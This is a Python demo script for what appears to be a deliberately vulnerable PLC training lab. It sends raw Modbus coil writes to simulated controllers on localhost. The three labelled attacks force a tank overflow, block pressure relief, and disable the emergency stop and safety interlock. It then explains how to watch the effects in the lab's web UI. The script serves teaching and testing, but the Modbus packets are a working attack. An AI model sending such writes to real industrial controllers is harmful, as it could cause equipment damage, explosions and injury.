#!/usr/bin/env python3
"""
Demo script to show Modbus attacks and their effects on the web UI
"""
import socket
import struct
import requests
import json
import time

def read_state():
    """Read current state from shared state file"""
    try:
        with open('/tmp/plc_state.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def modbus_write_coil(host, port, coil, value):
    """Write a single coil via Modbus"""
    sock = socket.socket()
    sock.settimeout(5)
    sock.connect((host, port))

    # MBAP Header + Write Single Coil
    coil_value = 0xFF00 if value else 0x0000
    request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
    sock.send(request)
    response = sock.recv(1024)
    sock.close()

    return response

def print_header(text):
    """Print a nice header"""
    print("\n" + "="*70)
    print(f"  {text}")
    print("="*70)

def print_state_comparison(before, after, keys):
    """Print before/after comparison"""
    print(f"\n{'State':<30} {'BEFORE':<15} {'AFTER':<15} {'Changed?':<10}")
    print("-" * 70)
    for key in keys:
        before_val = before.get(key, 'N/A')
        after_val = after.get(key, 'N/A')
        changed = "YES <<<" if before_val != after_val else ""
        print(f"{key:<30} {str(before_val):<15} {str(after_val):<15} {changed:<10}")

print("""
╔══════════════════════════════════════════════════════════════╗
║  Vuln-PLC Attack Demonstration                               ║
║  Watch Modbus attacks affect the Web UI in real-time!       ║
╚══════════════════════════════════════════════════════════════╝
""")

# Attack 1: Tank Overflow (Turn pump ON, valve CLOSED)
print_header("ATTACK 1: Tank Overflow Attack")
print("Target: PLC-1 (Tank Control) - Port 5502")
print("Attack: Turn pump ON + Close drain valve")

print("\n[*] Reading current state...")
before = read_state()

print("[*] Executing Modbus attacks...")
print("    └─ Writing coil 0 (pump1_status) = ON")
modbus_write_coil('127.0.0.1', 5502, 0, True)
time.sleep(0.2)

print("    └─ Writing coil 3 (valve1_status) = CLOSED")
modbus_write_coil('127.0.0.1', 5502, 3, False)
time.sleep(0.5)

print("[*] Reading new state...")
after = read_state()

print_state_comparison(before, after, ['pump1_status', 'valve1_status', 'tank1_level'])

print("\n[!] IMPACT: Pump is filling tank but drain valve is closed!")
print("    Tank will overflow causing physical damage.")

# Attack 2: Pressure Vessel Rupture
print_header("ATTACK 2: Pressure Vessel Rupture")
print("Target: PLC-2 (Pressure Control) - Port 5503")
print("Attack: Turn compressor ON + Close relief valve")

before2 = read_state()

print("\n[*] Executing Modbus attacks...")
print("    └─ Writing coil 0 (compressor) = ON")
modbus_write_coil('127.0.0.1', 5503, 0, True)
time.sleep(0.2)

print("    └─ Writing coil 4 (relief valve) = CLOSED")
modbus_write_coil('127.0.0.1', 5503, 4, False)
time.sleep(0.5)

after2 = read_state()

print_state_comparison(before2, after2, ['pump1_status', 'valve4_status', 'tank1_pressure'])

print("\n[!] IMPACT: Pressure building with no relief!")
print("    Vessel will rupture causing explosion hazard.")

# Attack 3: Safety System Bypass
print_header("ATTACK 3: Safety System Bypass")
print("Target: PLC-4 (Safety/ESD) - Port 5505")
print("Attack: Disable emergency stop + Disable safety interlock")

before3 = read_state()

print("\n[*] Executing Modbus attacks...")
print("    └─ Writing coil 0 (emergency_stop) = DISABLED")
modbus_write_coil('127.0.0.1', 5505, 0, False)
time.sleep(0.2)

print("    └─ Writing coil 1 (safety_interlock) = DISABLED")
modbus_write_coil('127.0.0.1', 5505, 1, False)
time.sleep(0.5)

after3 = read_state()

print_state_comparison(before3, after3, ['emergency_stop', 'safety_interlock'])

print("\n[!] IMPACT: All safety systems disabled!")
print("    No automatic shutdown in case of emergency.")

# Web UI Instructions
print_header("HOW TO SEE THE EFFECTS IN WEB UI")
print("""
1. Open browser to: http://localhost:5000
2. Login with: admin / admin
3. Navigate to one of these pages:

   📊 HMI Page (http://localhost:5000/hmi)
   ├─ Shows: Tank Level, Pump Status, Valve Status
   ├─ Real-time gauges and indicators
   └─ Auto-refreshes every 2 seconds

   🎛️  Process Page (http://localhost:5000/process)
   ├─ Shows: All equipment status (pumps, valves, motors)
   ├─ Control buttons (but attacks bypass web controls!)
   └─ Full state display at bottom

   📈 SCADA Dashboard (http://localhost:5000/scada)
   ├─ Overview of all 4 PLCs
   ├─ Process diagram
   └─ System status

4. Watch the values change in real-time!
   ├─ Pump status indicators will show ON/OFF
   ├─ Valve status will show OPEN/CLOSED
   ├─ Tank levels and pressures will change
   └─ Alarms may trigger for dangerous conditions

WHAT TO LOOK FOR:
✓ "Pump 1 Status" should show "true" or "ON" or green indicator
✓ "Valve 1 Status" should show "false" or "CLOSED" or red indicator
✓ "Emergency Stop" should show "false" or "DISABLED"
✓ Check the "full_state" JSON at the bottom of Process page
✓ Look for alarm banners at the top (high levels, high pressure)

TIP: Open the browser dev console (F12) and watch the Network tab
     to see the /api/process/status calls every 2 seconds with
     updated values!
""")

print("\n[*] Current full state:")
final_state = read_state()
print(json.dumps(final_state, indent=2, sort_keys=True))

print("\n" + "="*70)
print("  Demo complete! Open the web UI to see the effects.")
print("="*70 + "\n")
